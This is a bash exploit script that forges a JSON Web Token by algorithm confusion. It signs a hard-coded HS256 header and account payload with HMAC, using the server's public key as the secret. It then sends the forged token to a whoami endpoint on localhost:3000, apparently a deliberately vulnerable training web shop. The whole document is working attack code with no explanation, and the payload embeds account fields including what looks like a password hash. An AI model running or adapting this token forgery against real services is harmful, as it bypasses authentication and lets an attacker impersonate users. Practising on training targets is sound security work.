#!/bin/bash

server_key_hex=$(cat jwt.pub | xxd -p | tr -d "\\n")

# Already compromised jwt, we need to sign it to make valid
header="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
payload="eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIxMjNyc2EtbG9yZEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiYjY0MmI0MjE3YjM0YjFlOGQzYmQ5MTVmYzY1YzQ0NTIiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjQtMDUtMTcgMTA6MDM6NTEuNDA5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjQtMDUtMTcgMTA6Mjc6NTMuNzk2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcxNzA2MDA1OX0"

header_payload="${header}.${payload}"

# Generate the signature
signature=$(echo -n "$header_payload" | openssl dgst -sha256 -mac HMAC -macopt hexkey:"$server_key_hex" | cut -d " " -f 2)

# Encode the signature to Base64 URL-safe format
encoded_signature=$(echo -n "$signature" | xxd -r -p | base64 | sed 's/+/-/g; s/\//_/g; s/=//g' | tr -d "\\n")

# Combine token
jwt_token="${header_payload}.${encoded_signature}"

echo "$jwt_token"

#------

api_endpoint="http://localhost:3000/rest/user/whoami"

cookie_value="welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=en; continueCode=rKuxhWtVIpirS8U8Hrt2c2I9T5CyspFKi6fDSRUjHxueh7tMIaTRCMsgFVSKU6HrNuQQhL5tZecvYINVTbysVjFeof8LHVZuN2hBvtnkIl8T4DCgVFkJio7fa5SRDUM5H9lt4PcvNTBMs91FaMiNRfZ5SEgUlkuvRh1jtLXcJqC2zsRyiqEfwZU59HjLukqhJetzVcayIqE; token=$jwt_token"


# Call the API with the new token
response=$(curl -s -H "Authorization: Bearer $jwt_token" \
                  -H "Accept: application/json, text/plain, */*" \
                  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36" \
                  -H "sec-ch-ua: \"Chromium\";v=\"123\", \"Not:A-Brand\";v=\"8\"" \
                  -H "sec-ch-ua-mobile: ?0" \
                  -H "sec-ch-ua-platform: \"macOS\"" \
                  -H "Sec-Fetch-Site: same-origin" \
                  -H "Sec-Fetch-Mode: cors" \
                  -H "Sec-Fetch-Dest: empty" \
                  -H "Referer: http://localhost:3000/" \
                  -H "Accept-Encoding: gzip, deflate, br" \
                  -H "Accept-Language: en-US,en;q=0.9" \
                  -H "Connection: close" \
                  -H "Cookie: $cookie_value" \
                  "$api_endpoint")

# Output the response from the API call
echo "API Response: $response"